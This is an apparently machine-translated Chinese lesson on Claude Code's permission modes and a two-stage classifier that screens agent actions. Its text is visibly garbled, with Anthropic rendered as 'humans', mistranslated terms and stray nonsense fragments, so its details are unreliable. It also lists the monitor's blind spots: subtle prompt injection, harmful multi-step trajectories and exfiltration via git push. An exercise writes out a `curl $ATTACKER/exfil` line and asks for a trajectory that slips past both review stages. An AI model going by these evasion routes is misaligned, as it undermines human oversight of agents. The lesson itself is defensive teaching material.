# 作为自主代理的克劳德代码:权限模式与自动模式

> 克劳德代码 暴露了七种权限模式――"计划" 会在每个动作前询问,"默认"只会对有风险的动作询问,"接受编辑" 会自动批准文件写入,但仍然会确认 shell 执行,"绕过许可" 会批准一切――自动模式(2026年3月24日) 使用两阶段并行安全分类器 取代每动作批准:每个动作会运行单代币快速检查;标记的动作会启动思想链深度审查――动作预算通过`max_turns`和 `max_budget_usd`强制执行──自动模式 以研究预览 形式发布人类 已明确表示,分类器 单独使用并不足──

**类型：**学习 课程
**语言：**字符串 (stdlib,两阶段分类模拟器)
**先修要求：**阶段15 · 01(长视线代理),阶段15 · 09(编码代理景观)
**时间：**约45分钟

## 问题

你机器上的自主编码代理是一个独立的安全类别.攻击面就是该代理能够访问所有文件系统,网络,凭证,剪辑板,任何浏览器标签,任何打开的终端.

克劳德代码的权限系统是人类给出的答案――它不是一个自主/非自主开关,而是七种模式组成的能力阶梯:计划 →默认 →接受编辑 → ... →绕过许可.

工程问题是:这个系统能捕捉到什么,会丢失什么,以及一个特定任务应该使用什么模式?

## 概念

### 七种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

(上面的名称与公开克劳德代码文件 一致;"yolo" 是对允许的中途的非正式简称.

### 一页理解自动模式

汽车模式 (自动模式) 是第一个逐动作批准委托给模型的权限模式.

1. **Stage 1 — single-token classifier。**在每一个拟议动作上运行.成本低. 回归"安全"或"旗"――设计为主代理循环并运行,因此已批准的动作不会停留在队列中.
2. **Stage 2 — secondary policy/safety review。**仅在标记的动作上运行. 围绕该动作,会议,当前状态和声明任务执行聚焦的政策和安全评估.

预算控制与分类器并列出:

- `max_turns` 一个会议中总代次数――
- `max_budget_usd` 触发会议 中止的美元上限.
- 每个工具的动作次数限制,例如不超过N次`WebFetch`呼叫) 』

### 系统能抓住什么

- 工具输入中直接的即时注射,其中注入指令映射到已知有风险的动作形态――
- 重复工具循环分类器可以看到N+1与N 连续五次的操作几乎相同.
- 在本应仅编辑文件的会议中,显然越界的命令.

### 系统可能会错过什么

- **微妙的 prompt injection**直接提示注射不是完全可修复的漏洞.
- **语义层面的不当行为。**每个单独动作看起来都可能安全,但组合的轨迹是有害的.
- **通过合法渠道 exfiltration。**将数据写入你拥有的文件,然后`git push`现在,我们在公共服务中,

### 研究预览 定位

作为研究预览发布文档明确说明,分类器是一层防护,而不是完整的解决方案:用户应将自动模式与预算,拨款者,隔离工作空间和轨迹审计进行结合使用.

### 这条阶梯在你的工作流程中位置

- 不熟悉的任务:从`plan`开始──阅读计划比回滚一次糟糕运行更便宜──
- 已知回复器:`acceptEdits`能省下大量确认点击.
- 无人监视的背景运行:只在你已经测量过爆炸半径的工作空间内使用 `autoMode`(没有凭证,没有生产,没有你未主动选择的出口)
- 暂时容器:当且仅当容器 及其凭证可丢弃,`yolo`现在,`bypassPermissions`才可接受.


```figure
autonomy-oversight
```

## 使用它

`code/main.py`模拟两阶段分类器.第一阶段是针对拟议动作的廉价关键字规则.第二阶段是更慢的多规则审查器.

## 交付它

`outputs/skill-permission-mode-picker.md`任务描述将与正确的权限模式,预算上限和需要的隔离相匹配.

## 练习

1. 运行`code/main.py`◎ 哪种合成行动类型从未被标记为第一阶段,但总是被捕获为第二阶段?

2. 扩展第一阶段规则集,以捕捉特定的已知坏形状`curl $ATTACKER/exfil`在良性作用样本上测量虚假阳性率.

3. 阅读人类的"代理循环如何工作"文档――列出代理在`default`模式下默认触碰的每一种外部状态. 在无监督的运行.`autoMode`什么需要单独加门?

4. 设计一个24小时无监督运行预算:`max_turns`,我知道.`max_budget_usd`‧每工具帽‧允许者‧说明每个数字的理由‧

5. 描述一个轨迹:其中每一个单独动作都得到第1阶段和第2阶段批准,但组合行为却不一致――14课程介绍杀死开关和色代币如何处理这个问题――)

## 关键术语

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 权限模式,预算,行动格式.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview)管理服务 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code)功能表面与自动模式公告
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 塑造分类器 判断的基于理性的层――
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 关于长视界许可设计的内部视角──
